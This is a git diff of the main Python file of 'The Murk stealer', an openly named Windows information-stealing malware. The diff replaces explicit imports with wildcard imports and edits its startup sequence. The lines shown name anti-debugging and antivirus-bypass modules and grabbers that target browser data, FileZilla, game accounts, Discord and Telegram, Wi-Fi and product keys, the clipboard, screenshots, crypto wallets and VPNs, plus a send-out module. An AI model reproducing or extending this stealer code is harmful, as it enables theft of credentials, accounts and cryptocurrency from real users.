@@ -10,35 +10,9 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-
+from targets.targets import *
+from manager.manager import *
 from preferences.config import config
-from manager.antiDebug import AntiDebug
-from manager.avbypass import AvByPass
-from manager.folders import Folders
-from targets.files.files import TxtFiles
-from targets.files.filezilla import FileZilla
-from targets.files.file_grabber import Grab
-from targets.browsers.chromium import Chromium
-from targets.browsers.geckodriver import GeckoDriver
-from targets.games.steam import Steam
-from targets.games.epicgames import Epic
-from targets.games.uplay import Ubisoft
-from targets.games.battlenet import BattleNet
-from targets.games.minecraft import Minecraft
-from targets.messengers.discord import Discord
-from targets.messengers.telegram import Telegram
-from targets.messengers.viber import Viber
-from targets.messengers.skype import Skype
-from targets.messengers.pidgin import Pidgin
-from targets.system.system_info import SystemInfo
-from targets.system.productkey import ProductKey
-from targets.system.clipboard import ClipBoard
-from targets.system.wifi import Wifi
-from targets.system.programs import Programs
-from targets.system.photos import Screenshot
-from targets.wallets.wallets import Wallets
-from targets.vpn.vpn import VPN
-from manager.send import Send
 from sys import exit,argv
 from win32com.client import Dispatch
 from os.path import abspath
@@ -47,7 +21,7 @@ from os.path import abspath
 
 class TheMurk:
     def __init__(self) -> None:
-        self.msgInfo = ["",""]#System, Other
+        self.msgInfo = ["",""]
         self.Progress()
     
     def Progress(self):
@@ -60,14 +34,14 @@ class TheMurk:
         self.System()
         self.GrabFiles()
         self.Conclusion()
-        exit()
+        exit(0)
 
     def Start(self):
         if not config.debuging:
-            AntiDebug(config.oneStart)
+            AntiDebug()
         if config.avbypass:
             AvByPass()
-        Folders(config.enableFileGrabber)
+        Folders()
     
     def GrabFiles(self):
         if config.enableFileGrabber:
